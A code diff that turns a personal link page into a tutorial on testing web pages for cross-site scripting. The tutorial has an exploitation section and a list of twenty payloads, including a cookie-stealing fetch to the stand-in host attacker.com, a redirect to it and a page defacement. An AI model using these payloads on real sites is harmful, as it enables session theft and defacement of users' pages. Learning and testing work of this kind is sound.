@@ -1,73 +1,236 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Channel and Blog</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f0f0f0;
-            margin: 0;
-            padding: 0;
-        }
-        .container {
-            margin: 5% auto;
-            padding: 40px;
-            width: 80%;
-            max-width: 1200px;
-            background: white;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-            animation: fadeIn 2s ease-in-out;
-        }
-        h1 {
-            color: #333;
-        }
-        a {
-            display: inline-block;
-            margin: 20px 10px;
-            padding: 15px 30px;
-            color: white;
-            text-decoration: none;
-            border-radius: 5px;
-            font-size: 18px;
-            transition: transform 0.3s;
-            animation: colorRotate 4s infinite;
-        }
-        a:hover {
-            transform: scale(1.1);
-        }
-        a:first-child {
-            background-color: #25D366;
-        }
-        a:last-child {
-            background-color: #4285F4;
-        }
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
-        }
-        @keyframes colorRotate {
-            0% { background-color: #25D366; }
-            25% { background-color: #128C7E; }
-            50% { background-color: #4285F4; }
-            75% { background-color: #0b66c3; }
-            100% { background-color: #25D366; }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      line-height: 1.6;
+      color: #333;
+      margin: 0;
+      padding: 40px;
+      background-color: #1a1a1a;
+      max-width: 1200px;
+      margin: 0 auto;
+      position: relative;
+      overflow: hidden;
+    }
+    body::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 10%, transparent 10.01%);
+      background-size: 20px 20px;
+      animation: lightning 5s infinite linear;
+      z-index: -1;
+    }
+    @keyframes lightning {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+    h1, h2, h3 {
+      color: #3498db;
+    }
+    h1 {
+      font-size: 2.8em;
+      margin-bottom: 25px;
+    }
+    h2 {
+      font-size: 2.2em;
+      margin-top: 40px;
+      margin-bottom: 20px;
+    }
+    h3 {
+      font-size: 1.8em;
+      margin-top: 35px;
+      margin-bottom: 15px;
+    }
+    p {
+      font-size: 1.2em;
+      margin-bottom: 20px;
+      color: #fff;
+    }
+    ul, ol {
+      margin-bottom: 25px;
+      padding-left: 25px;
+      color: #fff;
+    }
+    code {
+      background-color: #2d2d2d;
+      padding: 3px 6px;
+      border-radius: 4px;
+      font-family: "Courier New", Courier, monospace;
+      color: #f8f8f2;
+    }
+    pre {
+      background-color: #2d2d2d;
+      color: #f8f8f2;
+      padding: 20px;
+      border-radius: 6px;
+      overflow-x: auto;
+      font-size: 1.1em;
+    }
+    a {
+      color: #3498db;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .cta {
+      background-color: #3498db;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+      border-radius: 6px;
+      margin-top: 40px;
+    }
+    .cta a {
+      color: #fff;
+      font-weight: bold;
+    }
+    .tool-list {
+      margin-bottom: 30px;
+    }
+    .tool-list li {
+      margin-bottom: 10px;
+    }
+    .payload-list {
+      margin-bottom: 30px;
+    }
+    .payload-list li {
+      margin-bottom: 15px;
+    }
+    .github-button {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background-color: #3498db;
+      color: #fff;
+      padding: 10px 20px;
+      border-radius: 5px;
+      text-decoration: none;
+      font-weight: bold;
+      animation: float 3s infinite ease-in-out;
+    }
+    @keyframes float {
+      0%, 100% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(-10px);
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Welcome to My Channel and Blog!</h1>
-        <p>Check out my WhatsApp channel and blog by clicking the buttons below:</p>
-        <a href="https://whatsapp.com/channel/0029VaCBM8AKGGG9l6g6Lz0b" target="_blank">Join Channel</a>
-        <a href="https://nowhackactivity.blogspot.com/" target="_blank">Visit Blog</a>
-    </div>
+
+  <h1>Step-by-Step Guide to Testing XSS Vulnerabilities</h1>
+  <p>Cross-Site Scripting (XSS) is a critical vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This guide will walk you through testing for XSS vulnerabilities, including tools, techniques, and resources.</p>
+
+  <h2>What is XSS?</h2>
+  <p>XSS occurs when an application allows user-supplied input to be executed as JavaScript in the browser. Attackers can exploit this to:</p>
+  <ul>
+    <li>Steal sensitive data (e.g., cookies, session tokens).</li>
+    <li>Perform actions on behalf of the user.</li>
+    <li>Deface websites.</li>
+    <li>Redirect users to malicious sites.</li>
+  </ul>
+
+  <h2>Types of XSS</h2>
+  <ul>
+    <li><strong>Reflected XSS</strong>: The injected script is reflected off a web server, such as in search results or error messages.</li>
+    <li><strong>Stored XSS</strong>: The injected script is permanently stored on the server, such as in a database or comment section.</li>
+    <li><strong>DOM-based XSS</strong>: The vulnerability exists in the client-side code (JavaScript) rather than the server.</li>
+  </ul>
+
+  <h2>Step-by-Step Testing Guide</h2>
+
+  <h3>Step 1: Identify XSS Entry Points</h3>
+  <p>Look for features or parameters that accept user input. Examples include:</p>
+  <ul>
+    <li>Search bars.</li>
+    <li>Comment sections.</li>
+    <li>Form inputs (e.g., name, email, password).</li>
+    <li>URL parameters.</li>
+  </ul>
+
+  <h3>Step 2: Test for XSS Vulnerabilities</h3>
+  <p>Here’s how to test for XSS vulnerabilities:</p>
+  <ul>
+    <li><strong>Basic XSS Testing</strong>: Inject simple scripts like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>.</li>
+    <li><strong>Bypass Filters</strong>: Use encoding or obfuscation to bypass input filters.</li>
+    <li><strong>Test for DOM-based XSS</strong>: Check if user input is used in JavaScript functions like <code>eval()</code> or <code>innerHTML</code>.</li>
+  </ul>
+
+  <h3>Step 3: Exploit XSS Vulnerabilities</h3>
+  <p>Once you’ve identified an XSS vulnerability, you can:</p>
+  <ul>
+    <li>Steal cookies using <code>document.cookie</code>.</li>
+    <li>Redirect users to malicious sites using <code>window.location</code>.</li>
+    <li>Perform actions on behalf of the user (e.g., change passwords).</li>
+  </ul>
+
+  <h3>Step 4: Report the Vulnerability</h3>
+  <p>Document the issue, provide a Proof of Concept (PoC), and suggest mitigations like input validation and output encoding.</p>
+
+  <h2>Tools for XSS Testing</h2>
+  <p>Here are some tools to help you test for XSS vulnerabilities:</p>
+  <ul class="tool-list">
+    <li><strong>Burp Suite</strong>: <a href="https://portswigger.net/burp" target="_blank">Download Burp Suite</a></li>
+    <li><strong>OWASP ZAP</strong>: <a href="https://www.zaproxy.org/" target="_blank">Download OWASP ZAP</a></li>
+    <li><strong>XSStrike</strong>: <a href="https://github.com/s0md3v/XSStrike" target="_blank">GitHub - XSStrike</a></li>
+    <li><strong>XSSer</strong>: <a href="https://github.com/epsylon/xsser" target="_blank">GitHub - XSSer</a></li>
+    <li><strong>BeEF</strong>: <a href="https://beefproject.com/" target="_blank">Download BeEF</a></li>
+  </ul>
+
+  <h2>Example Payloads</h2>
+  <p>Here are 20 example payloads to test for XSS:</p>
+  <ul class="payload-list">
+    <li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> - Basic XSS payload.</li>
+    <li><code>&lt;img src=x onerror=alert(1)&gt;</code> - XSS using image tag.</li>
+    <li><code>&lt;svg/onload=alert(1)&gt;</code> - XSS using SVG tag.</li>
+    <li><code>&lt;body onload=alert(1)&gt;</code> - XSS using body tag.</li>
+    <li><code>&lt;a href="javascript:alert(1)"&gt;Click Me&lt;/a&gt;</code> - XSS using JavaScript in href.</li>
+    <li><code>&lt;iframe src="javascript:alert(1)"&gt;</code> - XSS using iframe.</li>
+    <li><code>&lt;input type="text" value="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</code> - XSS in input field.</li>
+    <li><code>&lt;textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/textarea&gt;</code> - XSS in textarea.</li>
+    <li><code>&lt;div onmouseover=alert(1)&gt;Hover Me&lt;/div&gt;</code> - XSS using mouseover event.</li>
+    <li><code>&lt;script&gt;document.cookie&lt;/script&gt;</code> - Steal cookies.</li>
+    <li><code>&lt;script&gt;window.location="http://attacker.com"&lt;/script&gt;</code> - Redirect to malicious site.</li>
+    <li><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> - Show domain name.</li>
+    <li><code>&lt;script&gt;alert(window.location)&lt;/script&gt;</code> - Show current URL.</li>
+    <li><code>&lt;script&gt;alert(navigator.userAgent)&lt;/script&gt;</code> - Show user agent.</li>
+    <li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> - Show cookies.</li>
+    <li><code>&lt;script&gt;fetch("http://attacker.com?cookie="+document.cookie)&lt;/script&gt;</code> - Send cookies to attacker.</li>
+    <li><code>&lt;script&gt;document.body.innerHTML="Hacked"&lt;/script&gt;</code> - Deface website.</li>
+    <li><code>&lt;script&gt;document.write("Hacked")&lt;/script&gt;</code> - Overwrite page content.</li>
+    <li><code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code> - Simple alert box.</li>
+    <li><code>&lt;script&gt;console.log("XSS")&lt;/script&gt;</code> - Log message to console.</li>
+  </ul>
+
+  <h2>Resources for Further Learning</h2>
+  <ul>
+    <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP XSS Cheat Sheet</a></li>
+    <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger XSS Guide</a></li>
+    <li><a href="https://github.com/s0md3v/XSStrike" target="_blank">XSStrike Tool</a></li>
+    <li><a href="https://beefproject.com/" target="_blank">BeEF Framework</a></li>
+  </ul>
+
+  <div class="cta">
+    <p>Found this guide helpful? <a href="#" target="_blank">Share it with your friends</a> and leave a comment below!</p>
+  </div>
+
+  <!-- GitHub Button -->
+  <a href="https://github.com/Death112233" class="github-button" target="_blank">Follow Me on GitHub</a>
+
 </body>
 </html>
